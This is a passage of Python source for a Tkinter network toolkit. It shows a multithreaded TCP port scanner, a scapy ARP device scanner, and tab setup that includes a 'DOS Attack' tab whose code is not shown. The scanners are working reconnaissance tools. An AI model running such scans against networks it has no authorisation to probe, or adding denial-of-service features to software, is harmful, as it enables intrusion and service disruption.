        start_btn = Button(buttons_frame, text="Start Scanner", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=start)
        start_btn.grid(column=0, row=0, padx=5, pady=5)
        start_btn.bind("<Return>", lambda event: start())

        stop_btn = Button(buttons_frame, text="Stop Scanner", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=stop)
        stop_btn.grid(column=1, row=0, padx=5, pady=5)
        stop_btn.bind("<Return>", lambda even: stop())

        clear_btn = Button(buttons_frame, text="Clear", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=clear_tree)
        clear_btn.grid(column=2, row=0, padx=5, pady=5)
        clear_btn.bind("<Return>", lambda event: clear_tree())

        scanner_tree = ttk.Treeview(network_scanner_frame)
        scanner_tree.pack(side=LEFT, expand=True, fill=BOTH)

        output_text = Text(network_scanner_frame, font=Font.normal(10), width=30, bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        output_text.pack(side=RIGHT, expand=True, fill=BOTH)
        update_scanner_tree()

    def create_port_scanner():
        def scanner(ip:str, port:int):
            if PortScanner.run is False:
                return
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(Data.save_file['port_scanner_timeout'])
            try:
                s.connect((ip, port))
                s.close()
                with Data.print_lock:
                    PortScanner.count += 1
                    PortScanner.success_count += 1
                    port_counter_label.config(text=f"Scanned Ports: {PortScanner.count}\nOpen Ports: {PortScanner.success_count}")
                    row = scanner_tree.insert("", END, text="Open Port Found")
                    scanner_tree.insert(row, END, text=f"Port {port} is open on {ip}")
            except Exception as e:
                with Data.print_lock:
                    PortScanner.count += 1
                    port_counter_label.config(text=f"Scanned Ports: {PortScanner.count}\nOpen Ports: {PortScanner.success_count}")

        def start_scanner():
            ip = str(ip_entry.get())
            p1 = int(p1_combo.get())
            p2 = int(p2_combo.get())
            threads = int(thread_limit_entry.get())

            PortScanner.success_count = 0
            PortScanner.count = 0
            PortScanner.run = True
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(p1, p2):
                    executor.submit(scanner, ip, port)
            messagebox.showinfo("Port Scanner", f"Scanned {PortScanner.count} ports, found {PortScanner.success_count} open ports")
            PortScanner.run = False

        def stop_scanner():
            if PortScanner.run is False:
                messagebox.showerror("Failed to Stop Scanner", "There is no scanner running")
                return
            PortScanner.run = False

        port_counter_label = Label(port_scanner_frame, text=f"Scanned Ports: {PortScanner.count}\nOpen Ports: {PortScanner.success_count}", font=Font.normal(15), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color'])
        port_counter_label.pack()

        fields_frame = Frame(port_scanner_frame, bg=Data.save_file['bg_color'])
        fields_frame.pack()

        buttons_frame = Frame(port_scanner_frame, bg=Data.save_file['bg_color'])
        buttons_frame.pack()

        Label(fields_frame, text="IP", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)
        Label(fields_frame, text="Port Range", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=1)
        Label(fields_frame, text="Thread Limit", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=2)

        ip_entry = Entry(fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        ip_entry.grid(column=1, row=0)
        ip_entry.bind("<Return>", lambda event: Thread(target=start_scanner).start())
        ip_entry.insert(0, Data.user_ip)

        port_range_frame = Frame(fields_frame, bg=Data.save_file['bg_color'])
        port_range_frame.grid(column=1, row=1)
        ports = [0]
        for i in range(65535):
            ports.append(i + 1)
        p1_combo = ttk.Combobox(port_range_frame, font=Font.normal(10), width=10, values=ports)
        p1_combo.grid(column=0, row=0)
        p1_combo.current(1)
        Label(port_range_frame, text="-", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=1, row=0)
        p2_combo = ttk.Combobox(port_range_frame, font=Font.normal(10), width=10, values=ports)
        p2_combo.grid(column=2, row=0)
        p2_combo.current(65535)

        thread_limit_entry = Entry(fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        thread_limit_entry.insert(0, "500")
        thread_limit_entry.bind("<Return>", lambda event: Thread(target=start_scanner).start())
        thread_limit_entry.grid(column=1, row=2)

        start_btn = Button(buttons_frame, text="Start Scanner", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=lambda: Thread(target=start_scanner).start())
        start_btn.grid(column=0, row=0, padx=5, pady=5)
        start_btn.bind("<Return>", lambda event: Thread(target=start_scanner).start())

        stop_btn = Button(buttons_frame, text="Stop Scanner", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=stop_scanner)
        stop_btn.grid(column=1, row=0, padx=5, pady=5)
        stop_btn.bind("<Return>", lambda event: stop_scanner())

        scanner_tree = ttk.Treeview(port_scanner_frame)
        scanner_tree.pack(fill=BOTH, expand=True)

    def create_device_scanner():
        def scanner(ip):
            req = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            combined = broadcast/req
            answered_list = scapy.srp(combined, timeout=Data.save_file['device_scanner_timeout'], verbose=False)[0]
            for res in answered_list:
                row = scanner_tree.insert("", END, text=res[1].psrc)
                scanner_tree.insert(row, END, text=res[1].hwsrc)

        def start_scan():
            router_ip = str(router_ip_entry.get())
            port = str(port_combo.get())
            
            ip = f"{router_ip}/{port}"
            scanner(ip)

        fields_frame = Frame(device_scanner_frame, bg=Data.save_file['bg_color'])
        fields_frame.pack()

        buttons_frame = Frame(device_scanner_frame, bg=Data.save_file['bg_color'])
        buttons_frame.pack()

        Label(fields_frame, text="Router IP", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=0)
        Label(fields_frame, text="Port", font=Font.normal(10), bg=Data.save_file['bg_color'], fg=Data.save_file['fg_color']).grid(column=0, row=1)

        router_ip_entry = Entry(fields_frame, font=Font.normal(10), bg=Data.save_file['text_box_color'], fg=Data.save_file['fg_color'])
        router_ip_entry.grid(column=1, row=0)
        router_ip_entry.bind("<Return>", lambda event: start_scan())
        router_ip_entry.insert(0, "10.0.0.1")

        ports = [0]
        for i in range(65535):
            ports.append(i + 1)
        port_combo = ttk.Combobox(fields_frame, font=Font.normal(10), width=8, values=ports)
        port_combo.grid(column=1, row=1)
        port_combo.current(24)

        scan_btn = Button(buttons_frame, text="Scan", font=Font.normal(10), bd=0, bg=Data.save_file['button_color'], fg=Data.save_file['button_text_color'], command=start_scan)
        scan_btn.grid(column=0, row=0, padx=5, pady=5)
        scan_btn.bind("<Return>", lambda event: start_scan())

        scanner_tree = ttk.Treeview(device_scanner_frame)
        scanner_tree.pack(fill=BOTH, expand=True)

    geoip_frame = Frame(main_notebook, bg=Data.save_file['bg_color'], width=Data.width, height=Data.height)
    geoip_frame.pack(fill=BOTH, expand=True)
    main_notebook.add(geoip_frame, text="GeoIP Search")
    create_geoip()

    dos_frame = Frame(main_notebook, bg=Data.save_file['bg_color'], width=Data.width, height=Data.height)
    dos_frame.pack(fill=BOTH, expand=True)
    main_notebook.add(dos_frame, text="DOS Attack")
    create_dos()

    network_scanner_frame = Frame(main_notebook, bg=Data.save_file['bg_color'], width=Data.width, height=Data.height)
    network_scanner_frame.pack(fill=BOTH, expand=True)
    main_notebook.add(network_scanner_frame, text="Network Scanner")
    create_network_scanner()

    port_scanner_frame = Frame(main_notebook, bg=Data.save_file['bg_color'], width=Data.width, height=Data.height)
    port_scanner_frame.pack(fill=BOTH, expand=True)
    main_notebook.add(port_scanner_frame, text="Port Scanner")
    create_port_scanner()

    device_scanner_frame = Frame(main_notebook, bg=Data.save_file['bg_color'], width=Data.width, height=Data.height)
    device_scanner_frame.pack(fill=BOTH, expand=True)
    main_notebook.add(device_scanner_frame, text="Device Scanner")
    create_device_scanner()

    root.bind("<Key-Escape>", lambda event: disable_all_func())

    root.mainloop()
main()